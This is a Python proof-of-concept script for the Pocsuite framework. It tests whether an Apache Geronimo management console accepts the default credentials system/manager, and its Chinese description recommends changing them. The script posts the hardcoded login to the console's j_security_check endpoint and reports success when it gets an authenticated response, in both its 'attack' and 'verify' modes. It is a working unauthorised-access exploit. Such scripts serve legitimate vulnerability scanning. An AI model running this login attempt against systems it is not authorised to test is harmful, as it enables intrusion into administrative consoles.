#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import time
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'apache_geronimo_weak_password'
    vulID = '0'
    author = ['LRestless']
    vulType = 'weak-pass'
    version = '1'
    references = ['']
    desc = u'''可以通过使用默认凭据访问ApacheGeronimo的管理控制台。
    Geronimo管理控制台的默认管理员用户名和密码和命令行部署工具分别为system和manager。
    您应该直接从Geronimo管理控制台通过访问Security->ConsoleRealm更改这些默认设置，
    并从控制台领域用户组件更改用户名和密码。'''

    vulDate = '2015-06-18'
    createDate = '2019-03-19'
    updateDate = '2019-03-20'

    appName = 'Apache Geronimo'
    appVersion = '3.0'
    appPowerLink = 'http://geronimo.apache.org/'
    samples = ['']

    def _attack(self):
        """attack mode"""
        return self._verify()
        pass

    def _verify(self):
        """verify  mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        data = {
            'j_username': 'system',
            'j_password': 'manager',
            'submit': '登陆'
        }
        url = '/console/portal/j_security_check'
        self.url = self.url.strip('/') + url
        resp = s.post(self.url, data=data)
        time.sleep(2)
        if 'Logout' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

